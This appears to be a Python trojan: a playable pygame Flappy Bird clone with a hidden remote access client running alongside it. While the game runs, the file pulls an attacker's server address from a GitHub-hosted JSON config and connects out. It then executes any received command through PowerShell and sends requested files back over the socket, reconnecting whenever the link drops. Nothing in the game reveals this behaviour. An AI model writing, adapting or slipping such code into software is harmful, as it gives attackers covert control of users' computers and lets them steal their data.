import socket
import subprocess
import os
import pygame
import sys
import random
import time
import threading
import json
import urllib.request

IDENTIFIER = "<END_OF_COMMAND_RESULT>"
FILE_IDENTIFIER = "<END_OF_FILE>"

WIDTH, HEIGHT = 400, 600
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
BLUE = (135, 206, 235)
GREEN = (0, 255, 0)
RED = (255, 0, 0)
GRAVITY = 0.5
BIRD_JUMP = -10
PIPE_SPEED = 3
PIPE_GAP = 150

pygame.init()
font = pygame.font.SysFont("Arial", 30)

def send_file(file_path, guest_socket):
    try:
        with open(file_path, "rb") as file:
            while chunk := file.read(1024):
                guest_socket.sendall(chunk)
        guest_socket.sendall(FILE_IDENTIFIER.encode())
    except FileNotFoundError:
        guest_socket.sendall(f"File not found: {file_path}".encode() + IDENTIFIER.encode())
    except Exception as e:
        guest_socket.sendall(f"Error transferring file: {e}".encode() + IDENTIFIER.encode())

def handle_download(command, guest_socket):
    file_path = command[9:].strip()
    send_file(file_path, guest_socket)

def handle_upload(command, guest_socket):
    file_path = command[7:].strip()
    if not file_path:
        guest_socket.sendall(f"No file specified for upload.{IDENTIFIER}".encode())
        return
    send_file(file_path, guest_socket)

def execute_command(command, guest_socket):
    try:
        output = subprocess.run(
            ["powershell.exe", command], capture_output=True, text=True
        )
        if output.returncode == 0:
            result = output.stdout.strip() + IDENTIFIER
        else:
            result = output.stderr.strip() + IDENTIFIER
    except Exception as e:
        result = f"Error executing command: {e}" + IDENTIFIER
    guest_socket.sendall(result.encode())

def handle_cd(command, guest_socket):
    path_to_change = command[3:].strip()
    try:
        os.chdir(path_to_change)
        result = f"Changed directory to: {os.getcwd()}" + IDENTIFIER
    except FileNotFoundError:
        result = f"Directory not found: {path_to_change}" + IDENTIFIER
    except Exception as e:
        result = f"Error changing directory: {e}" + IDENTIFIER
    guest_socket.sendall(result.encode())

def create_pipe():
    pipe_top = random.randint(100, HEIGHT - PIPE_GAP - 100)
    pipe_bottom = pipe_top + PIPE_GAP
    return [WIDTH, pipe_top, pipe_bottom, False]

def draw_pipes(screen, pipes):
    for pipe in pipes:
        pygame.draw.rect(screen, GREEN, (pipe[0], 0, 60, pipe[1]))
        pygame.draw.rect(screen, GREEN, (pipe[0], pipe[2], 60, HEIGHT - pipe[2]))

def move_pipes(pipes):
    for pipe in pipes:
        pipe[0] -= PIPE_SPEED
    return [pipe for pipe in pipes if pipe[0] + 60 > 0]

def check_collision(bird_x, bird_y, pipes):
    if bird_y < 0 or bird_y > HEIGHT:
        return True
    for pipe in pipes:
        if bird_x + 30 > pipe[0] and bird_x < pipe[0] + 60:
            if bird_y < pipe[1] or bird_y + 30 > pipe[2]:
                return True
    return False

def draw_button(screen, text, x, y, width, height, color, text_color):
    pygame.draw.rect(screen, color, (x, y, width, height))
    button_text = font.render(text, True, text_color)
    screen.blit(button_text, (x + (width - button_text.get_width()) // 2, y + (height - button_text.get_height()) // 2))

def is_button_pressed(mouse_pos, x, y, width, height):
    return x < mouse_pos[0] < x + width and y < mouse_pos[1] < y + height

def show_game_over(screen, score):
    retry_button_x = WIDTH // 2 - 100
    retry_button_y = HEIGHT // 2 + 50
    retry_button_width = 200
    retry_button_height = 50

    while True:
        screen.fill(BLUE)
        game_over_text = font.render("Game Over!", True, WHITE)
        score_text = font.render(f"Your Score: {score}", True, WHITE)

        screen.blit(game_over_text, (WIDTH // 2 - game_over_text.get_width() // 2, HEIGHT // 3))
        screen.blit(score_text, (WIDTH // 2 - score_text.get_width() // 2, HEIGHT // 3 + 50))

        draw_button(screen, "Retry", retry_button_x, retry_button_y, retry_button_width, retry_button_height, GREEN, WHITE)

        pygame.display.flip()

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            if event.type == pygame.MOUSEBUTTONDOWN:
                if is_button_pressed(event.pos, retry_button_x, retry_button_y, retry_button_width, retry_button_height):
                    return True

def reset_game():
    return 50, HEIGHT // 2, 0, [], 0

def main_game():
    screen = pygame.display.set_mode((WIDTH, HEIGHT))
    pygame.display.set_caption("Flappy Bird")
    clock = pygame.time.Clock()

    bird_x, bird_y, bird_velocity, pipes, score = reset_game()

    running = True
    while running:
        screen.fill(BLUE)

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                return False
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_SPACE:
                    bird_velocity = BIRD_JUMP

        bird_velocity += GRAVITY
        bird_y += bird_velocity

        if not pipes or pipes[-1][0] < WIDTH - 200:
            pipes.append(create_pipe())
        pipes = move_pipes(pipes)

        if check_collision(bird_x, bird_y, pipes):
            running = False

        for pipe in pipes:
            if pipe[0] + 60 < bird_x and not pipe[3]:
                score += 1
                pipe[3] = True

        pygame.draw.circle(screen, RED, (bird_x, bird_y), 15)
        draw_pipes(screen, pipes)

        score_text = font.render(f"Score: {score}", True, WHITE)
        screen.blit(score_text, (10, 10))

        pygame.display.flip()
        clock.tick(60)

    if not show_game_over(screen, score):
        return False
    else:
        return main_game()

def server_connection(server_IP, server_port):
    server_address = (server_IP, server_port)
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as guest_socket:
            guest_socket.connect(server_address)
            print("Connected to server.")

            json_url = "https://raw.githubusercontent.com/msulthannasyira/jsonforhacker/main/client3.json"
            response = urllib.request.urlopen(json_url)
            config_data = json.loads(response.read())

            print("Fetched JSON config from GitHub:", config_data)

            while True:
                command = guest_socket.recv(1024).decode('utf-8', errors='ignore')
                if not command:
                    break

                if command.startswith("cd "):
                    handle_cd(command, guest_socket)
                elif command.startswith("getfile "):
                    handle_download(command, guest_socket)
                elif command.startswith("upload "):
                    handle_upload(command, guest_socket)
                else:
                    execute_command(command, guest_socket)
    except Exception as e:
        print(f"Connection error: {e}")
        time.sleep(5)
        print("Retrying connection...")

if __name__ == "__main__":
    while True:
        try:
            game_thread = threading.Thread(target=main_game)
            game_thread.start()

            json_url = "https://raw.githubusercontent.com/msulthannasyira/jsonforhacker/main/client3.json"
            response = urllib.request.urlopen(json_url)
            config_data = json.loads(response.read())

            server_IP = config_data['server']['ip']
            server_port = config_data['server']['port']

            print(f"Connecting to server at {server_IP}:{server_port}...")
            server_thread = threading.Thread(target=server_connection, args=(server_IP, server_port))
            server_thread.start()
            server_thread.join()

        except Exception as e:
            print(f"An error occurred: {e}")
            time.sleep(5)
            print("Retrying...")
